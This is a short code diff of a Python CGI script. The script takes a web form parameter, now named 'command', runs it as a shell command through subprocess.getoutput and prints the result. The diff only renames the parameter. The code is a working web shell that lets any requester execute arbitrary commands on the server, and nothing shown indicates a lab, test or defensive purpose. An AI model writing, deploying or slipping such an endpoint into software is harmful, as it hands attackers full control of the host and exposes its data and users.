@@ -8,7 +8,7 @@ print()
 import subprocess as sb
 import cgi
 
-var = cgi.FieldStorage("x")
-command = var.getvalue("x")
+var = cgi.FieldStorage("command")
+command = var.getvalue("command")
 output = sb.getoutput(command)
 print(output)
